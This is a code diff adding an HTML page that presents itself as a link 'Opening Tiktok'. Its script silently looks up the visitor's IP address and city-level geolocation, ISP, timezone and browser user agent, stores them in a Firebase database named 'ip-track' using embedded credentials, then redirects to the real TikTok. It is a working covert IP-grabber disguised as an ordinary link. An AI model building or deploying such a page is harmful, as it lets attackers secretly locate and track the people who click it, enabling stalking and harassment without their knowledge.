@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Tiktok</title>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+</head>
+<body>
+  <h2>Opening Tiktok.</h2>
+
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyBuTzIg-rYAnnRK6o7WOyoh0ylY7-5CwLg",
+      authDomain: "ip-track-abdb1.firebaseapp.com",
+      databaseURL: "https://ip-track-abdb1-default-rtdb.firebaseio.com/",
+      projectId: "ip-track-abdb1",
+      storageBucket: "ip-track-abdb1.appspot.com",
+      messagingSenderId: "311555011892",
+      appId: "1:311555011892:web:935ae2cf458efdfd6de161"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(ipData => {
+        fetch(`https://ipapi.co/${ipData.ip}/json/`)
+          .then(res => res.json())
+          .then(data => {
+            const info = {
+              ip: ipData.ip,
+              country: data.country_name,
+              region: data.region,
+              city: data.city,
+              org: data.org,
+              timezone: data.timezone,
+              userAgent: navigator.userAgent,
+              time: new Date().toLocaleString()
+            };
+            db.ref("ipData").push(info);
+            setTimeout(() => {
+              window.location.href = "https://www.tiktok.com/";
+            }, 2000);
+          });
+      });
+  </script>
+</body>
+</html>
